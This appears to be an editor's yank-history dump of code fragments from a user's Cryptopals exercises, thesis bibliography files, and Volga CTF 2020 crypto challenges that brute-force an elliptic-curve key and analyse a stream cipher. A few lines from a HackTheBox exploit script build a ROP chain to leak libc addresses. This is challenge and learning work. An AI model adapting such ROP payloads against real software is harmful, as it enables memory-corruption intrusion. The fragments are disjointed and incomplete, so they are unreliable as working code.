434f2af6f42dfe6bb8342a98e9573ca0|file:///home/neo/cryptopals/set1/set1.py|110|21|v|python
	* min_keysize
f704af6f45b384cc21ea9870b22e8383|file:///home/neo/cryptopals/set1/set1.py|111|5|V|python
	    print(blocks)
187a79e1f4be465e50544049a8f64bea|file:///home/neo/cryptopals/set1/set1.py|115|5|V|python
	    excess = cipher
b568b2c10f2f163973845a6028d411bd|file:///home/neo/cryptopals/set1/set1.py|112|40|v|python
	min_keysize, min_keysize):
2b95504e1e6f1c9ecbbe2094bae77796|file:///home/neo/cryptopals/set1/set1.py|112|40|v|python
	min_keysize
8198aae20cf079eddd48db9fd0d2dd9a|file:///home/neo/cryptopals/set1/set1.py|115|1|V|python
	            blocks[j].append(ciphertext[i+j])
6b80246c7458fb8f7d58e87010e907c2|file:///home/neo/cryptopals/set1/set1.py|112|5|V|python
	    print(excess)
a5561efb0b1b8ffd203cd1d1350174b2|file:///home/neo/cryptopals/set1/set1.py|115|20|v|python
	excess - 1, 0, -1):
1572aecc36256f69f5587247b7e632ce|file:///home/neo/cryptopals/set1/set1.py|115|5|V|python
	    print(len(ciphertext))
60b6fd55d2c7067816b6ed372d5523c3|file:///home/neo/cryptopals/set1/set1.py|117|9|V|python
	        print('test')
e8428d44174e1ae93b26b45dca170b1c|file:///home/neo/cryptopals/set1/set1.py|115|13|V|python
	            print(blocks[j])
fa9eea5b0805ace33661fcacc126d229|file:///home/neo/cryptopals/set1/set1.py|110|14|v|python
	[[]] * min_keysize
5b7a343e82e8b8098fd5fb7dc1e1baae|file:///home/neo/cryptopals/set1/set1.py|118|1|V|python
	            for k in range(min_keysize):
	                print(k , " " ,blocks[k])
0d6c55222c2f234fb0dd84ba516cade6|file:///home/neo/cryptopals/set1/set1.py|120|29|V|python
	    for i in range(min_keysize):
	        print(len(blocks[i]))
d669049290d338c75e722b08ed303626|file:///home/neo/cryptopals/set1/set1.py|115|1|V|python
	    for i in range(0, 25, 5):
0dfc7f62fefc48648521b8eafa1b72ec|file:///home/neo/cryptopals/set1/set1.py|73|106|v|python
	sorted(string_scores, key=string_scores.get, reverse=True
3ae8af822c3a2e3dd59fb4084919ddce|file:///home/neo/cryptopals/set1/set1.py|72|5|V|python
	    print(sorted_scores[0])
9c57a874fe522e99edf9b593f9b8ff4a|file:///home/neo/cryptopals/set1/set1.py|72|5|V|python
	    if get_key:
8c483c777b0c103f875859c463998b6e|file:///home/neo/cryptopals/set1/set1.py|125|9|V|python
	        print(block)
319e51fa046761c26d94b6cfa732034c|file:///home/neo/cryptopals/set1/set1.py|125|49|v|python
	hexstring
e32c25bdac6cd200598122744112c503|file:///home/neo/cryptopals/set1/set1.py|126|9|V|python
	        block_hex = block_str.hex()
c65fb9ee51ad5044cbb2b06167a0ba70|file:///home/neo/cryptopals/set1/set1.py|125|24|v|python
	ecs.encode(codecs.decode(bytearray(block_str), 'utf-8'), 'hex').decode()
92a688b3f28a0b4c53e806509c4c9c3f|file:///home/neo/cryptopals/set1/set1.py|125|9|V|python
	        # block_hex = codecs.encode(bytearray(block_str, 'utf-8'), 'hex')
5416c3ff4300d52e1e5dfdc5097f050e|file:///home/neo/cryptopals/set1/set1.py|126|9|V|python
	        print(block_hex)
2d4f7c50f7dd5e9a890fd52b2d388306|file:///home/neo/cryptopals/set1/set1.py|127|5|V|python
	    print(key)
9745440b5b88e9e853ca6d6ec0703311|file:///home/neo/cryptopals/set1/set1.py|117|1|V|python
	    for i in range(0,len(ciphertext) - excess, min_keysize):
	        for j in range(min_keysize):
	            (blocks[j]).append(ciphertext[i+j])
	    for i in range(0, excess):
f34aa00e83979f54ea5a17cdab933973|file:///home/neo/cryptopals/set1/set1.py|131|14|v|python
	locks[j]).append(ciphertext[i+j])
55ae438920b7b617692476ca782d9230|file:///home/neo/cryptopals/set1/set1.py|127|5|V|python
	    key = ''.join(n for n in key_list)
be392ed7db88ad247c50eb200906a60f|file:///home/neo/cryptopals/set1/set1.py|127|17|v|python
	bytes()
e7f1228ffd0b2ae52904e4132f0ff5c8|file:///home/neo/cryptopals/set1/set1.py|131|5|V|python
	    # print(plaintext)
c8538f7c68b90114060a242db1740721|file:///home/neo/cryptopals/set1/set1.py|132|22|v|python
	[-i-1] = 
24035224081120219ec2d92f7d57681c|file:///home/neo/cryptopals/set1/set1.py|134|5|V|python
	    print(plaintext)
2789e2309ebb0729b4445b562db11d14|file:///home/neo/cryptopals/set1/set1.py|107|9|V|python
	        print(samples)
118434083290345f57d3c81a0842b6a9|file:///home/neo/cryptopals/set1/set1.py|106|31|v|python
	keysize
0663b8af9df17b966dc2116a2a4ce571|file:///home/neo/cryptopals/set1/set1.py|105|9|v|python
	repeats
a11fa144121ec5e9afb424f6748ec8be|file:///home/neo/cryptopals/set1/set1.py|106|9|V|python
	        print(blocks)
ea673d725fc05f63555f60193b8f79a1|file:///home/neo/cryptopals/set1/set1.py|122|13|v|python
	(blocks[j]).append(ciphertext[i+j])
9a30b72d835a44fdee7e41b3fafca7f0|file:///home/neo/cryptopals/set1/set1.py|136|5|v|python
	print(plaintext)
e2350f6a302a9f3e8b794a25e547e1c4|file:///home/neo/cryptopals/set1/set1.py|131|9|V|python
	        key_text = ''.join(c for c in key)
21a6f0c749e2dd612fbea9fb160b515f|file:///home/neo/cryptopals/set1/set1.py|111|13|V|python
	        if log_info:
	            print("Key size:", keysize, " " ,avg_dist)
0131b28e008140b45cfc92ed88b1ad1e|file:///home/neo/Documents/diplomatiki/auth.js/.gitignore|3|1|V|
	*.pdf
05513143a7673656ea2edf8dabc885c3|file:///home/neo/cryptopals/set1/set1.py|161|5|V|python
	    calanthe = open('ct.txt', 'r')
e5d506472627237ed894136331103c1b|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|16|v|bib
	inproceedings
92a2b5cb9c6906035c2864fa225e1940|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|10|v|bib
	article
9cacaaf3cce9c43908274ed3c3c6eb1c|file:///home/neo/Documents/diplomatiki/auth.js/related.tex|7|139|v|tex
	scrypt
c4295780bd6ba6a40e0c7b6f6fe74035|file:///home/neo/Documents/diplomatiki/auth.js/related.tex|7|5|v|tex
	 state
afe4c6d14aee2a5393433665273b143e|file:///home/neo/Documents/diplomatiki/auth.js/related.tex|7|1|v|tex
	Many cryptographic primitives are not yet implemented in the major web browsers
550f8e772a75d943201aab8dbad3edd9|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|2|16|v|bib
	7467361
db39fc81ecadf4117669a008116120b4|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|7|v|bib
	Hofstede_usingthe
0d64cb424a6fc4fb4e4be3bf5f71f925|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|10|v|bib
	aertsen2017bring
17ab14fc9f031a131368f03a8a5121a2|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|10|v|bib
	letsencrypt-https
8a4d4beb6f8d119df89e24e82719e858|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|1|10|v|bib
	DBLP:journals/corr/ManousisRDAS16
d3c48f95a4d21c7ef9c77d3b37a969ec|file:///home/neo/Documents/diplomatiki/auth.js/paper.bib|14|1|V|bib
	  timestamp = {Mon, 13 Aug 2018 16:48:48 +0200},
	  biburl    = {https://dblp.org/rec/journals/corr/ManousisRDAS16.bib},
	  bibsource = {dblp computer science bibliography, https://dblp.org}
788b464df8cfdcbfbae5dac1327a9ac2|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|47|1|V|python
	PUTS_PLT = exe.plt["puts"]
320fa3aa3cef1e5a0171afa306699f67|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|61|1|V|python
	payload += p64(POP_RDI)
	payload += p64(PUTS_GOT)
	payload += p64(PUTS_PLT)
b061c1a0ff39dbb60c0661d3ada39549|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|47|10|V|python
	PUTS_GOT = exe.got["puts"]
	PRINTF_GOT = exe.got["printf"]
4f7b333db4b4df9d3abf3094c093c7ba|file:///home/neo/hackthebox/pwn/ropmev2/exploit.py|65|1|V|python
	payload += p64(PRINTF_GOT)
1ea814133924936e3e4793bd09607cd2|file:///home/neo/cryptopals/set1/set1.py|157|1|V|python
	    # Challenge 6
	    enc_file = open('6.txt', 'r')
	    enc_text = enc_file.read()
	    enc_hex = base64_to_hex(enc_text)
	    plaintext = decrypt_repeating_xor(enc_hex, log_info=True)
a463c9ad9393e2b17db94ba0d665edd7|file:///home/neo/cryptopals/set1/set1.py|162|17|v|python
	decrypt_repeating_xor(enc_hex, log_info=True)
0d88875b2fefadd4d86f39e287f6cdb6|file:///home/neo/cryptopals/set1/set1.py|162|15|v|python
	base64_to_hex(enc_text)
d3b83bfb7d4ac8f65e392a8541f22c54|file:///home/neo/cryptopals/set1/set1.py|162|5|V|python
	    enc_hex = base
237c7a19fd07604a0130894568d25518|file:///home/neo/cryptopals/set1/set1.py|164|33|v|python
	enc_hex
e26f2dae18f44319cfdaa55d6ffd0d78|file:///home/neo/cryptopals/set1/set1.py|195|1|V|python
	    # lines = enc_file.read().splitlines()
52db2f260c3db4abaa280dccca803576|file:///home/neo/cryptopals/set1/set1.py|162|5|V|python
	    for block in blocks:
b2e18eccc0cf1ac3b4f8a459fb463458|file:///home/neo/cryptopals/set1/set1.py|163|27|v|python
	ciphertext[i:i+32]
5c96d2a4581cb89384eaba419465aee8|file:///home/neo/cryptopals/set1/set1.py|165|1|V|python
	    print(len(block_dict))
bb4c374392133719a324ab1ba2799cd6|file:///home/neo/cryptopals/set1/set1.py|165|21|v|python
	dict
320f0318b5284514b3c8b515e1b18501|file:///home/neo/cryptopals/set1/set1.py|165|5|V|python
	    print(len(block_list))
14e49cd541fafe55fa63a9bb3940770b|file:///home/neo/cryptopals/set2/set2.py|5|5|V|python
	    print(padding_byte)
49f9d75e4cda5b3fcca0da52ba4f5685|file:///home/neo/cryptopals/set2/set2.py|4|20|v|python
	bytes(padding)
78684857993a5aba75ef87d646cb7975|file:///home/neo/cryptopals/set2/set2.py|6|5|V|python
	    # return text.ljust(length, padding_byte)
f949fa40e58d2f2be1a9e08ffdf71e91|file:///home/neo/cryptopals/set2/set2.py|4|21|v|python
	'{:x}'.format(padding)
24c47950e19f0800c0349281be7d9239|file:///home/neo/cryptopals/set2/set2.py|5|5|V|python
	    print(padding_bytes)
32b14c3c6bd7616c8b5b148a8674adca|file:///home/neo/cryptopals/set2/set2.py|4|45|v|python
	.encode('utf-8')
ab12d5aa7facc1b33480b612bf10feb9|file:///home/neo/cryptopals/set2/set2.py|7|54|v|python
	.decode()
83fa0ff670634b21c7169760026f2992|file:///home/neo/cryptopals/set1/set1.py|205|1|V|python
	    # print(single_byte_xor('1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736', 100))
7d452f434c78404f2a9eb9dcc09e5bce|file:///home/neo/cryptopals/set2.py|2|8|v|python
	. set1
8617a6c09eb76d9882db8ee31a420654|file:///home/neo/cryptopals/set2.py|2|1|V|python
	import 
3eb8a8859ee5b911bebcc66a47f8777b|file:///home/neo/cryptopals/set2/set2.py|2|20|v|python
	seset1
3b37e4ed3082f4a0175b4912b6fd9312|file:///home/neo/cryptopals/set2/set2_sol.py|15|5|V|python
	    print(single_byte_xor('1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736', 100))
294bce1a85c8d9f9525c7e72d124e286|file:///home/neo/CTFs/volga2020/keygreed/client.py|89|9|v|python
	, PORT = sys.argv[1], int(sys.argv[2])
0e8aff2ef275565b39c4224fc76511a3|file:///home/neo/CTFs/volga2020/keygreed/client.py|89|1|V|python
	    HOST
	    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
	        sock.connect((HOST,PORT))
24c335dd122366ed7d19666f7591bdc3|file:///home/neo/CTFs/volga2020/keygreed/client.py|93|21|v|python
	getMessageFromServer()
e3726e9e143d546494f0c9d6e55d986b|file:///home/neo/CTFs/volga2020/keygreed/client.py|68|1|V|python
	def getPointFromServer():
	    point = sock.recv(INPUTSIZE)
	    return msgpack.unpackb(point, list_hook = pointDecoder, raw = True)
93473a7344419b15c4219cc2b6c64c6f|file:///home/neo/CTFs/volga2020/keygreed/client.py|9|1|v|python
	import
d1981ed5730ece437e756fbca2375a68|file:///home/neo/CTFs/volga2020/keygreed/client.py|71|12|v|python
	msgpack.unpackb(point, list_hook = pointDecoder, raw = True)
78ee54aa8f813885fe2fe20d232518b9|file:///home/neo/CTFs/volga2020/keygreed/client.py|99|35|v|python
	point
b66bf31fdcc411aae8ae245f73820ffb|file:///home/neo/CTFs/volga2020/keygreed/client.py|70|13|v|python
	sock.recv(INPUTSIZE)
29eb119c6465d7e1759ad2b94c6c4176|file:///home/neo/CTFs/volga2020/keygreed/client.py|96|33|v|python
	.toRaw()
4e66511bec2e50baf759a857011ddd2b|file:///home/neo/CTFs/volga2020/keygreed/client.py|97|1|V|python
	    print(first_point_pkt)
a0b77f806ad6c6b6f0f5c474410d2386|file:///home/neo/CTFs/volga2020/keygreed/client.py|99|11|v|python
	first_point_pkt
dd0f340996995fb715b189ae1ade65c9|file:///home/neo/CTFs/volga2020/keygreed/client.py|102|5|V|python
	    # securePoint = msgpack.unpackb(second_point_pkt, list_hook = pointDecoder, raw = True)
c9f6fa831ec8fd4b4acf6836142f243e|file:///home/neo/CTFs/volga2020/keygreed/client.py|101|19|v|python
	msgpack.unpackb(second_point_pkt, list_hook = pointDecoder, raw = True)
7787645dda029420002bbd8f938e9180|file:///home/neo/CTFs/volga2020/keygreed/client.py|98|34|v|python
	second_point_pkt
ebb5bb4ed6415a11404d2bccafd1c0c1|file:///home/neo/CTFs/volga2020/keygreed/client.py|101|5|V|python
	    # print(second_point_pkt)
c4c68207db0eabd9ad23961eea252073|file:///home/neo/CTFs/volga2020/keygreed/client.py|104|5|V|python
	    # print(encrypted)
d6fcbf0f3c616b9612017f93a24062cc|file:///home/neo/CTFs/volga2020/keygreed/client.py|97|5|V|python
	    # print(first_point_pkt)
5534456dbc890d1e854e6e30fd39bedc|file:///home/neo/CTFs/volga2020/keygreed/client.py|104|5|V|python
	    # point = getPointFromServer()
076b3f23bd0bc113991907de33b09cd7|file:///home/neo/ccsc/mousesack/solution.txt|8|1|V|text
	https://github.com/diogoaj/ctf-writeups/blob/master/2017/picoctf/cryptography/ECC2-200/README.md
9d1a0bf4aacb4a93d20eeaed3cc04fad|file:///home/neo/CTFs/volga2020/keygreed/client.py|101|1|V|python
	    print(decx1)
64d67359976f021a252dc35b21804432|file:///home/neo/CTFs/volga2020/keygreed/client.py|99|1|V|python
	    decx1 = int('83c02e919804d3aa0aa98a3162a393884bb3f203', 16)
	    decy1 = int('11d46c5db96703a64609ddf2526b79bef026ceb7a', 16)
	    print(decx1)
	    print(decy1)
92b02d322fd846ce3ce5acc930c25055|file:///home/neo/CTFs/volga2020/keygreed/client.py|104|18|v|python
	83c02e919804d3aa0aa98a3162a393884bb3f203
7a5ead72a81980e224e17519a06e20e8|file:///home/neo/CTFs/volga2020/keygreed/client.py|105|18|v|python
	11d46c5db96703a64609ddf2526b79bef026ceb7a
aca865fb7a428a693500b8c0c676caa2|file:///home/neo/CTFs/volga2020/keygreed/client.py|113|5|V|python
	    secureNumber = 
3419d2b0e04994b802555fa30ce161ad|file:///home/neo/CTFs/volga2020/keygreed/client.py|94|1|V|python
	        # secureNumber = random.getrandbits(BITS)
d8b017547ea1cb87cafd8f933590394d|file:///home/neo/CTFs/volga2020/keygreed/client.py|113|5|V|python
	    # # sendPointToServer(sock, P * secureNumber)
022e34c249126f0ef2d8f65f1fd856b7|file:///home/neo/CTFs/volga2020/keygreed/client.py|116|1|V|python
	    # securePoint = secureNumber * point
	    # encrytpedFlag = getMessageFromServer()
	    # flag = decrypt(encrytpedFlag,securePoint.x)
	    # print('Your flag: {0}'.format(flag))
70e3ce6b059384f9bdbfec53fc74f86e|file:///home/neo/CTFs/volga2020/keygreed/client.py|117|9|V|python
	        encrytpedFlag = getMessageFromServer()
227a78776fc9a593c39e30adf1cc648e|file:///home/neo/CTFs/volga2020/keygreed/client.py|117|24|v|python
	encrytpedFlag
c650f6e51ca4af83ce59d808706c373f|file:///home/neo/CTFs/volga2020/keygreed/client.py|112|1|V|python
	    encrytpedFlag = packets[7]['Raw'].load
f02968c4a53b6e8ed2a2842f909ad573|file:///home/neo/CTFs/volga2020/keygreed/client.py|116|9|V|python
	        encrytpedFlag = packets[7]['Raw'].load
1ed9679648a77a7309338880362079ae|file:///home/neo/CTFs/volga2020/keygreed/client.py|66|1|V|python
	    socket.sendall(packed)
f59dcd306ec32930f1e78a1d82280b48|file:///home/neo/CTFs/volga2020/keygreed/client.py|105|20|v|python
	packed
18e268b884964f8a47476448dc029196|file:///home/neo/CTFs/volga2020/keygreed/client.py|105|12|v|python
	send(point)
a86d105d8a8b777bbb1e458b6fe50b7f|file:///home/neo/CTFs/volga2020/keygreed/client.py|106|12|v|python
	n(point)
de778ce2b0c133f7b5a4c8dfaedafcbe|file:///home/neo/CTFs/volga2020/keygreed/client.py|106|1|V|python
	        sock.send(point)
bb76166302abefdfba6d3c13c4f8a58f|file:///home/neo/CTFs/volga2020/keygreed/client.py|114|5|V|python
	    sock.send(encrytpedFlag)
85683cdadd8d0d063e04378d6b414338|file:///home/neo/CTFs/volga2020/keygreed/client.py|122|9|V|python
	        print('Your flag: {0}'.format(flag))
241f3b3b00bc4e80ec68d9d22179d5a6|file:///home/neo/CTFs/volga2020/keygreed/client.py|118|9|V|python
	        print(securePoint)
75d088030e34378a95c75b4ad51ffd19|file:///home/neo/CTFs/volga2020/keygreed/client.py|116|9|V|python
	    for i in range(2<<56):
	        # securePoint = secureNumber * point
	        securePoint = i * point
	        try:
	            flag = decrypt(encrytpedFlag,securePoint.x)
	            print('Your flag: {0}'.format(flag))
	        except(ValueError):
	            pass
3aa684ae29941af74ac37c69fbdcc461|file:///home/neo/CTFs/volga2020/keygreed/client.py|114|5|V|python
	    print(point)
c8ff66b3f7c28adb688dbaaf95c92edc|file:///home/neo/CTFs/volga2020/keygreed/client.py|103|4|V|python
	    k
70c3d78ec11fb9be955ec0c332c2f449|file:///home/neo/CTFs/volga2020/keygreed/client.py|119|1|V|python
	    securePoint = secureNumber * point
	    encrytpedFlag = getMessageFromServer()
	    flag = decrypt(encrytpedFlag,securePoint.x)
	    print('Your flag: {0}'.format(flag))
682d0acf5aa49b5f7860d14952ccf865|file:///home/neo/CTFs/volga2020/keygreed/client.py|104|5|V|python
	    # print(sent_point)
4d399e46e593de790a7aef58982d11ac|file:///home/neo/CTFs/volga2020/keygreed/client.py|104|1|V|python
	    decx1 = int('83c02e919804d3aa0aa98a3162a393884bb3f203', 16)
	    decy1 = int('11d46c5db96703a64609ddf2526b79bef026ceb7a', 16)
303fffcb61d2d32550ba1033e7ff779d|file:///home/neo/CTFs/volga2020/keygreed/client.py|34|1|V|python
	print(decx)
e6957106666648c27b3d6d907c9c45a2|file:///home/neo/CTFs/volga2020/export/server.py|41|1|V|python
	            p_block = message[frame*15:(frame+1)*15]
56bebfc57f976e37c410dbd82502705d|file:///home/neo/CTFs/volga2020/export/server.py|55|40|v|python
	"{0:b}".format(k_block[i])
b0cd2337f51c2c1ec03dd97aad7609b7|file:///home/neo/CTFs/volga2020/export/server.py|58|1|V|python
	                print("Cipher bits %s" % cipher_bits)
c8ef68c0fce4f4bfe0219809473d3651|file:///home/neo/CTFs/volga2020/export/server.py|59|24|v|python
	Cipher
48f6f613c8fd021611e3544f909be5ec|file:///home/neo/CTFs/volga2020/export/server.py|59|45|v|python
	cipher_bits
899ec3b5776f0ac0d6c7747bf1c4ba07|file:///home/neo/CTFs/volga2020/export/server.py|46|27|v|python
	0
	                for _ in range(114):
	                    k_block = (k_block << 1) + cipher.next_bit()
	                    print("K-block: %s" % 
12b23d96d92e85bc6859816baa3456b1|file:///home/neo/CTFs/volga2020/export/server.py|49|43|v|python
	"{0:b}".format(k_block))
2e2d64019ea01672f55957fea4ebc41a|file:///home/neo/CTFs/volga2020/export/server.py|54|27|v|python
	"{0:b}".format(k_block_bits[i])
6f875e37a153c369d5b8003bb12f4509|file:///home/neo/CTFs/volga2020/export/server.py|53|17|V|python
	                message_bits = "{0:b}".format(message)
97f767e6bccb9a22d1cb048616a79090|file:///home/neo/CTFs/volga2020/export/server.py|53|17|V|python
	                print(message_bits)
1272c066d3ba27c4d1e8efb2e8d429dd|file:///home/neo/CTFs/volga2020/export/server.py|44|17|V|python
	                print("P-block: %s" % "{0:b}".format(p_block))
cdc2a81d671adac9db83d9b92283e395|file:///home/neo/CTFs/volga2020/export/server.py|66|1|V|python
	            print("Ciphertext %s" % ciphertext)
1ad1356895d55f9a2c0c920ce5440742|file:///home/neo/CTFs/volga2020/export/server.py|65|17|V|python
	                print
26e69556fdc5f91e4b829dfa1d26dc4e|file:///home/neo/CTFs/volga2020/export/server.py|50|1|V|python
	                print("K-block bits: %s" % k_block_bits)
0a84fc68362c68f6ab57d3b5eba778e5|file:///home/neo/CTFs/volga2020/export/server.py|51|35|V|python
	                # cipher_bits = ""
	                # plaintext_bits = ""
	                # print("P-block: %s" % "{0:b}".format(p_block))
	                # for i in range(len(k_block_bits)):
	                #     bit = k_block_bits[i] 
	                #     if (i&1):
	                #         cipher_bits += bit 
	                #     else:
	                #         plaintext_bits += bit
	                # print("Cipher bits %s" % cipher_bits)
	                # print("Plaintext bits %s" % plaintext_bits)
d2cd974bcb6b834bd2f7c9d835b81fdd|file:///home/neo/CTFs/volga2020/export/server.py|53|17|V|python
	                print("P-block bits: %s" % "{0:b}".format(p_block))
b9818c902fd2dee1474a72a3f36026eb|file:///home/neo/CTFs/volga2020/export/server.py|52|1|V|python
	                # cipher_bits = ""
	                # plaintext_bits = ""
	                # for i in range(len(k_block_bits)):
	                #     bit = k_block_bits[i] 
	                #     if (i&1):
	                #         cipher_bits += bit 
	                #     else:
	                #         plaintext_bits += bit
	                # print("Cipher bits %s" % cipher_bits)
	                # print("Plaintext bits %s" % plaintext_bits)
071cc3c486795ec59cdf18e6c258912f|file:///home/neo/CTFs/volga2020/export/server.py|49|1|V|python
	                k_block_bits = "{0:b}".format(k_block)
	                print("K-block bits: %s" % k_block_bits)
7aa216b712c1318a309e5ff0114f2ff4|file:///home/neo/CTFs/volga2020/export/server.py|60|13|V|python
	            print("Ciphertext bits %s" % ciphertext_bits)
fa6b411e4299fc2ae74efe928054f84a|file:///home/neo/CTFs/volga2020/export/server.py|59|13|V|python
	            ciphertext_bits = "{0:b}".format(int.from_bytes(ciphertext, byteorder='big'))
0d52b00182c567dfe75634c202fe75cf|file:///home/neo/CTFs/volga2020/export/server.py|44|17|V|python
	                print(p_block)
3a79ac6e0ce00a118cd6065603f5d8b9|file:///home/neo/CTFs/volga2020/export/cipher.py|58|9|V|python
	        print(self.key)
291e4cce531f2344b25462e7712c14aa|file:///home/neo/CTFs/volga2020/export/cipher.py|77|1|V|python
	    key = [0x00, 0xfc, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff]
63b95053d1a408624cc2e71b7d9e2526|file:///home/neo/CTFs/volga2020/export/server.py|59|20|v|python
	Ciphertext bits before base64
cbecc448d0a3d81183271ad505c27186|file:///home/neo/CTFs/volga2020/export/server.py|58|31|V|python
	            ciphertext_bits = "{0:b}".format(int.from_bytes(ciphertext, byteorder='big'))
	            print("C-block bits: %s" % ciphertext_bits)
8be6177d2afdd1d300883c522ef78f12|file:///home/neo/CTFs/volga2020/export/server.py|51|17|V|python
	                print("Key bits: %s" % k_block_bits)
56d77bb4ffffc161f938b630b0084200|file:///home/neo/CTFs/volga2020/export/server.py|52|17|V|python
	                print("Key bits:     %s" % k_block_bits)
137f3e1ba753d0b68a573de605b2bef1|file:///home/neo/CTFs/volga2020/export/cipher.py|1|1|V|python
	#!/usr/lib/python3
a13d05543572e7b10927ca6e2690cdb8|file:///home/neo/CTFs/volga2020/export/server.py|43|1|V|python
	                p_block = bytearray(message[frame*15:(frame+1)*15], 'utf-8')
	                p_block = int.from_bytes(p_block, byteorder='big')
78e731027d8fd50ed642340b7c9a63b3|file:///home/neo/CTFs/volga2020/export/decrypt.py|5|21|v|python
	message
9da49249477f63816b9dabcfeb0f9a39|file:///home/neo/CTFs/volga2020/export/server.py|52|1|V|python
	                print("P-block bits: %s" % "{0:b}".format(p_block).rjust(120,'0'))
43de4f310f340cb6d99e6c18e819b6d8|file:///home/neo/CTFs/volga2020/export/server.py|38|1|V|python
	            n_blocks = int(len(message) / 15) + 1
	            print("N-blocks: %d" % n_blocks)
	            ciphertext = b''
	            for frame in range(n_blocks):
71e509b30a131f9683bb212da98c512a|file:///home/neo/CTFs/volga2020/export/decrypt.py|9|1|V|python
	print("N-blocks: %d" % n_blocks)
6d62f554024a864584b67e47588b6401|file:///home/neo/CTFs/volga2020/export/decrypt.py|9|1|V|python
	ciphertext = b''
335b78f34e5084d179f0a92a5cdf0db8|file:///home/neo/CTFs/volga2020/export/decrypt.py|5|28|V|python
	p_block = bytearray(plaintext[frame*15:(frame+1)*15], 'utf-8')
	p_block = int.from_bytes(p_block, byteorder='big')
96972bc5180fa5adc34e9eca69eb1410|file:///home/neo/CTFs/volga2020/export/decrypt.py|5|28|V|python
	p_block = bytearray(plaintext[frame*15:(frame+1)*15], 'utf-8')
	p_block = int.from_bytes(p_block, byteorder='big')
	print("Plaintext bits: %s" % "{0:b}".format(p_block).rjust(120,'0'))
d3bdbefe85c059f2fb0b816c9083ca2c|file:///home/neo/CTFs/volga2020/export/cipher.py|17|13|V|python
	            print(keybit)
58ae83892591be67912e4ec931e6ae3a|file:///home/neo/CTFs/volga2020/export/decrypt.py|4|15|v|python
	Kddk9QE
000e513f2542aab4a6b56b4d66f501b8|file:///home/neo/CTFs/volga2020/export/decrypt.py|4|15|v|python
	+H0/E3OGy1K69
6951cc7d1c4131b938289e6bb6bb149c|file:///home/neo/CTFs/volga2020/export/server.py|35|1|V|python
	            message: bytes = base64.b64decode("YQ==".strip())
b043d940b4fb7a5ae3ff440f0a74ad4b|file:///home/neo/CTFs/volga2020/export/decrypt.py|12|5|V|python
	    keystream = 
c000c612d81935eddeddd2fe36df0c98|file:///home/neo/CTFs/volga2020/export/decrypt.py|9|1|V|python
	ciphertext_bits
52f6396e0adb6955ed2306a0d28caca3|file:///home/neo/CTFs/volga2020/export/decrypt.py|8|1|V|python
	print("Ciphertext bits: %s" )
6d0feb4a514ad8188e08fbcd25a0b036|file:///home/neo/CTFs/volga2020/export/decrypt.py|5|1|V|python
	message: bytes = base64.b64decode(plaintext.strip())
c3f03ca06a156e52c48e4b4a2204ac28|file:///home/neo/CTFs/volga2020/export/decrypt.py|15|28|v|python
	cipher_bytes
112a35e37f277377f0ae085643836e91|file:///home/neo/CTFs/volga2020/export/decrypt.py|15|5|V|python
	    keystream = (p_block ^ c_block) >> 6
8f7abcefa9675d3d5bacfedc4c825a6a|file:///home/neo/CTFs/volga2020/export/decrypt.py|15|1|V|python
	    # print("Plain bits:   %s" % "{0:b}".format(p_block).rjust(118,'0'))
f97a1e5f9f9faf98e23ec70a90b6993b|file:///home/neo/CTFs/volga2020/export/decrypt.py|17|46|v|python
	p_block
62f8b4840571a13e5494eace1f0768cb|file:///home/neo/CTFs/volga2020/export/decrypt.py|17|56|v|python
	.rjust(118,'0'))
ab84262fa93fd6978a9a8f12f0c33ce1|file:///home/neo/CTFs/volga2020/export/decrypt.py|6|1|V|python
	ciphertext = "Kddk9QE+H0/E3OHrhZPh"
c7c2ac93a1b6fdd4408088263cd6de6f|file:///home/neo/CTFs/volga2020/export/cipher.py|82|5|v|python
	print ''.join(key)
555bde262b5989bd5ec20b3d802ba4e8|file:///home/neo/CTFs/volga2020/export/decrypt.py|15|34|^v|python
	"{0:b}".format(p_block).rjust(118,'0')
ed7a97589651cc91d10b2576ad532c42|file:///home/neo/CTFs/volga2020/export/cipher.py|82|5|V|python
	    print("Key:")
6fe783fdb86e3afa7a7b351ff6223153|file:///home/neo/CTFs/volga2020/export/cipher.py|83|1|V|python
	    for byte in key:
	        keystring += "{0:b}".format(byte).ljust(8,'0')
	    print("Key: %s" % keystring)
2e0160e078aa4b925e62b20610378253|file:///home/neo/CTFs/volga2020/export/cipher.py|89|9|v|python
	keystring
27c75a60d98378f4ea3cafcd5f74227e|file:///home/neo/CTFs/volga2020/export/cipher.py|90|28|v|python
	staticmethow
c40d8e0919297872b930c4c7d78afed0|file:///home/neo/CTFs/volga2020/export/cipher.py|87|1|V|python
	    stream1 = ""
	    for byte in test_keystream1:
	        stream1 += "{0:b}".format(byte).ljust(8,'0')
	    print("Stream 1: %s" % stream1)
d7cfea72eabf5b4a13bf64c82cb78a73|file:///home/neo/CTFs/volga2020/export/cipher.py|71|37|v|python
	0][-1] ^ self.regs[1][-1] ^ self.regs[2][-1]
	
	        return output
	
	
	if __name__ == '__main__':
	    key = [0x00, 0xfc, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff]
	    iv = 0x21
	    test_keystream1 = [0xf4, 0x51, 0x2c, 0xac, 0x13, 0x59, 0x37, 0x64, 0x46, 0x0b, 0x72, 0x2d, 0xad, 0xd5, 0x00]
	    test_keystream2 = [0x48, 0x00, 0xd4, 0x32, 0x8e, 0x16, 0xa1, 0x4d, 0xcd, 0x7b, 0x97, 0x22, 0x26, 0x51, 0x00]
	
	    keystring = ""
	    for byte in key:
	        keystring += 
63687f98c2e1a8c84273bb0bb8930a1d|file:///home/neo/CTFs/volga2020/export/cipher.py|84|22|v|python
	"{0:b}".format(byte).ljust(8,'0')
2a930668c1e23fe2bf90068d27d166bf|file:///home/neo/CTFs/volga2020/export/cipher.py|86|1|V|python
	        print("{0:b}".format(byte).ljust(8,'0'))
